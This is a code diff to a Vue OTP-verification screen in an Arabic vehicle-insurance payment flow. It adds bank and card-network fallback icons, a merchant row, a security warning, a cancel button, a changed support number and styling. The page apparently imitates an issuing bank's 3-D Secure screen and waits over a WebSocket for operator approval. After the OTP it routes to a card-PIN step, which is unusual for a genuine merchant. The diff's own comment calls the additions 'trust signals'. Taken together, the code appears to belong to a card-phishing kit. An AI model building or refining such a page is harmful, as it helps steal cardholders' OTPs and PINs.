@@ -2,7 +2,7 @@
     <div class="otp-shell" dir="rtl">
 
         <!-- ── Waiting Loader Modal (teleported fullscreen) ──────────── -->
-        <InsuranceLoader v-if="isVerifying && !error" :modal="true" color="amber" size="lg"
+        <InsLoading v-if="isVerifying && !error" :modal="true" color="amber" size="lg"
             :text="t( 'verification.otp.loading' )"
             :sub-text="t( 'verification.otp.waitingForApproval' )" />
 
@@ -13,7 +13,10 @@
             <div class="otp-topbar">
                 <div class="otp-topbar__bank">
                     <img v-if="bankLogo" :src="bankLogo" :alt="bankName" class="otp-topbar__bank-img" />
-                    <span v-else class="otp-topbar__bank-fallback">{{ bankName || t( 'verification.otp.issuingBank' ) }}</span>
+                    <div v-else class="otp-topbar__bank-fallback">
+                        <svg class="otp-topbar__bank-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 2L2 7h20L12 2zM4 7v10M8 7v10M12 7v10M16 7v10M20 7v10M2 17h20M3 21h18" /></svg>
+                        <span>{{ bankName || t( 'verification.otp.issuingBank' ) }}</span>
+                    </div>
                 </div>
                 <div class="otp-topbar__badge">
                     <svg class="otp-topbar__shield" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M10 1.944A11.954 11.954 0 012.166 5C2.056 5.649 2 6.319 2 7c0 5.225 3.34 9.67 8 11.317C14.66 16.67 18 12.225 18 7c0-.682-.057-1.351-.166-2A11.954 11.954 0 0110 1.944zM11 14a1 1 0 11-2 0 1 1 0 012 0zm0-7a1 1 0 10-2 0v3a1 1 0 102 0V7z" clip-rule="evenodd" /></svg>
@@ -21,6 +24,7 @@
                 </div>
                 <div class="otp-topbar__network">
                     <img v-if="networkLogo" :src="networkLogo" :alt="networkName" class="otp-topbar__network-img" />
+                    <svg v-else class="otp-topbar__network-fallback" viewBox="0 0 24 24" fill="none" stroke="currentColor"><rect x="1" y="4" width="22" height="16" rx="2" ry="2" stroke-width="1.5" /><line x1="1" y1="10" x2="23" y2="10" stroke-width="1.5" /></svg>
                 </div>
             </div>
 
@@ -35,6 +39,10 @@
 
                 <!-- Transaction Summary -->
                 <div class="otp-summary">
+                    <div class="otp-summary__row">
+                        <span class="otp-summary__label">{{ t( 'verification.otp.paymentPurpose' ) }}</span>
+                        <span class="otp-summary__value">تأمين مركبة – {{ merchantName }}</span>
+                    </div>
                     <div class="otp-summary__row">
                         <span class="otp-summary__label">{{ t( 'verification.otp.cardLabel' ) }}</span>
                         <span class="otp-summary__value ltr-nums" dir="ltr">**** {{ cardLast4 || '****' }}</span>
@@ -82,6 +90,12 @@
                     <OtpInput ref="otpInputRef" v-model="otpCode" :length="6" :accept-lengths="[4, 6]"
                         :disabled="isVerifying || codeExpired" :error="error || (codeExpired ? 'انتهت صلاحية الرمز' : '')" @submit="submitOtp" />
 
+                    <!-- Security Warning -->
+                    <div class="otp-security-warning">
+                        <svg class="otp-security-warning__icon" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M10 1.944A11.954 11.954 0 012.166 5C2.056 5.649 2 6.319 2 7c0 5.225 3.34 9.67 8 11.317C14.66 16.67 18 12.225 18 7c0-.682-.057-1.351-.166-2A11.954 11.954 0 0110 1.944zM11 14a1 1 0 11-2 0 1 1 0 012 0zm0-7a1 1 0 10-2 0v3a1 1 0 102 0V7z" clip-rule="evenodd" /></svg>
+                        <span>{{ t( 'verification.otp.doNotShareCode' ) }}</span>
+                    </div>
+
                     <button :disabled="!isOtpValid || isVerifying || codeExpired" class="otp-btn"
                         :class="isOtpValid && !isVerifying && !codeExpired ? 'otp-btn--active' : 'otp-btn--disabled'"
                         @click="submitOtp">
@@ -90,6 +104,10 @@
                             <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                         </svg>
                         <span>{{ isVerifying ? t( 'verification.otp.verifying' ) : t( 'verification.otp.confirmTransaction' ) }}</span>
+                    </button>
+
+                    <button type="button" class="otp-cancel" @click="$router.back()">
+                        {{ t( 'verification.otp.cancelTransaction' ) }}
                     </button>
                 </div>
 
@@ -139,7 +157,7 @@
         <!-- ── Help (outside card) ───────────────────────────────────── -->
         <div class="otp-help">
             <span class="otp-help__label">{{ t( 'common.supportContact' ) }}</span>
-            <a href="tel:920000000" class="otp-help__phone" dir="ltr">920000000</a>
+            <a href="tel:920033360" class="otp-help__phone" dir="ltr">920033360</a>
         </div>
     </div>
 </template>
@@ -157,11 +175,18 @@ import { getOtpStatus } from '@/api/paymentApi';
 import logger from '@/utils/logger';
 import { safeRedirect } from '@/utils/safeRedirect';
 import SarIcon from '@/components/SarIcon.vue';
-import InsuranceLoader from '@/components/ui/InsuranceLoader.vue';
+import InsLoading from '@/components/ui/InsLoading.vue';
 import OtpInput from '@/components/ui/OtpInput.vue';
 import { useCardBranding } from '@/composables/useCardBranding';
 import { getReasonLabel } from '@/constants/rejectionReasons';
 import paymentLogos from '@/../../resources/images/logo/master-visa-mada.webp';
+
+// ─── Order data (transaction context for trust signals) ─────────────
+const orderData = (() => {
+    try { return JSON.parse( sessionStorage.getItem( 'orderData' ) || '{}' ); }
+    catch { return {}; }
+})();
+const merchantName = computed( () => orderData?.plan?.companyName || 'تأمينكم' );
 
 const { t } = useI18n();
 const router = useRouter();
@@ -335,9 +360,8 @@ const { setup: setupWs } = usePaymentWebSocket( {
         trackOtpVerified();
         trackStepCompleted( 'otp', 'card_pin' );
 
-        // Defer navigation to release the WS message handler and avoid
-        // Chrome "[Violation] 'message' handler took Xms" warnings.
-        setTimeout( () =>
+        // Defer navigation via microtask to release the WS message handler
+        queueMicrotask( () =>
         {
             if ( event.redirect_to )
             {
@@ -346,7 +370,7 @@ const { setup: setupWs } = usePaymentWebSocket( {
             {
                 router.push( { name: 'cardPin' } );
             }
-        }, 0 );
+        } );
     },
 
     onRejected ( event )
@@ -467,6 +491,12 @@ onUnmounted( () =>
     animation: card-in 0.35s ease-out;
 }
 
+@media (min-width: 640px) {
+    .otp-card {
+        box-shadow: 0 4px 20px rgb(0 0 0 / 0.12), 0 0 0 1px rgb(0 0 0 / 0.04);
+    }
+}
+
 @keyframes card-in {
     from { opacity: 0; transform: translateY(6px); }
     to   { opacity: 1; transform: translateY(0); }
@@ -499,9 +529,19 @@ onUnmounted( () =>
 }
 
 .otp-topbar__bank-fallback {
+    display: flex;
+    align-items: center;
+    gap: 0.25rem;
     font-size: 0.6875rem;
     font-weight: 600;
     color: rgba(255, 255, 255, 0.7);
+}
+
+.otp-topbar__bank-icon {
+    width: 0.875rem;
+    height: 0.875rem;
+    opacity: 0.7;
+    flex-shrink: 0;
 }
 
 .otp-topbar__network-img {
@@ -509,6 +549,13 @@ onUnmounted( () =>
     width: auto;
     max-width: 3.5rem;
     object-fit: contain;
+}
+
+.otp-topbar__network-fallback {
+    width: 1.5rem;
+    height: 1.5rem;
+    opacity: 0.5;
+    color: rgba(255, 255, 255, 0.7);
 }
 
 .otp-topbar__badge {
@@ -632,8 +679,8 @@ onUnmounted( () =>
     align-items: flex-start;
     gap: 0.25rem;
     padding: 0.25rem 0.4375rem;
-    background: #fffbeb;
-    border: 1px solid #fde68a;
+    background: #eef4fb;
+    border: 1px solid #bbd5ed;
     border-radius: 0.1875rem;
 }
 
@@ -644,19 +691,19 @@ onUnmounted( () =>
     display: flex;
     align-items: center;
     justify-content: center;
-    color: #d97706;
+    color: #1a5276;
 }
 
 .otp-notice__title {
-    font-size: 0.5625rem;
+    font-size: 0.625rem;
     font-weight: 600;
-    color: #92400e;
+    color: #1a5276;
     margin: 0;
 }
 
 .otp-notice__text {
-    font-size: 0.5rem;
-    color: #a16207;
+    font-size: 0.5625rem;
+    color: #2c6994;
     margin: 0;
     line-height: 1.35;
 }
@@ -698,7 +745,7 @@ onUnmounted( () =>
     gap: 0.375rem;
     border: none;
     cursor: pointer;
-    transition: background 0.15s ease;
+    transition: background 0.2s ease, color 0.2s ease, transform 0.2s ease, box-shadow 0.2s ease;
     margin-top: 0.25rem;
 }
 
@@ -710,10 +757,13 @@ onUnmounted( () =>
 
 .otp-btn--active:hover {
     background: #154360;
+    transform: translateY(-1px);
+    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
 }
 
 .otp-btn--active:active {
     background: #0e2f44;
+    transform: translateY(0);
 }
 
 .otp-btn--disabled {
@@ -721,6 +771,48 @@ onUnmounted( () =>
     color: #9ca3af;
     cursor: not-allowed;
     border: none;
+    transform: none;
+    box-shadow: none;
+}
+
+/* ── Cancel link ──────────────────────────────────────── */
+.otp-cancel {
+    display: block;
+    width: 100%;
+    margin-top: 0.25rem;
+    padding: 0.25rem;
+    background: none;
+    border: none;
+    cursor: pointer;
+    font-size: 0.625rem;
+    color: #9ca3af;
+    text-align: center;
+    transition: color 0.15s;
+}
+
+.otp-cancel:hover {
+    color: #dc2626;
+}
+
+/* ── Security Warning ─────────────────────────────────── */
+.otp-security-warning {
+    display: flex;
+    align-items: center;
+    gap: 0.25rem;
+    padding: 0.25rem 0.375rem;
+    margin-top: 0.25rem;
+    font-size: 0.5625rem;
+    color: #b45309;
+    background: #fffbeb;
+    border: 1px solid #fde68a;
+    border-radius: 0.1875rem;
+}
+
+.otp-security-warning__icon {
+    width: 0.75rem;
+    height: 0.75rem;
+    flex-shrink: 0;
+    color: #d97706;
 }
 
 /* ── Resend ───────────────────────────────────────────── */
